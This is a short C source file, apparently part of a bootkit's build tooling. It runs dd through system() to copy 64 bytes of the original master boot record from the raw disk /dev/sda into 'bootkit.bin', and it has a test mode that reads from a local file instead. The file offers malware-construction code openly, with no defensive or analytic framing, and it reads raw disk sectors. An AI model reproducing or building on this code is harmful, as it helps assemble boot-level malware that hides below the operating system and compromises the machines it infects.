#include <stdio.h>
#include <stdlib.h>

#define TEST

int TEST_save_orig_mbr_64();
int save_orig_mbr_64();


int main()
{
#ifdef TEST
    int err = TEST_save_orig_mbr_64();
#else
    int err = save_orig_mbr_64();
#endif

    if (err == 0) {
        printf("success\n");
    } else {
        fprintf(stderr, "error\n");
    }

    return 0;
}

/*
   FOR TESTING: Copies the first 64 bytes from orig_mbr_64.bin to bootkit.bin
*/
int TEST_save_orig_mbr_64()
{
    printf("[TEST] Writing original MBR 64 bytes to bootkit\n");
    return system("dd if=orig_mbr_64.bin of=bootkit.bin bs=1 count=64 seek=4 conv=notrunc");
}

/*
    Copies the first 64 bytes from the original MBR on /dev/sda to bootkit.bin
*/
int save_orig_mbr_64()
{
    printf("Writing original MBR 64 bytes to bootkit\n");
    return system("dd if=/dev/sda of=bootkit.bin bs=1 count=64 seek=4 conv=notrunc");
}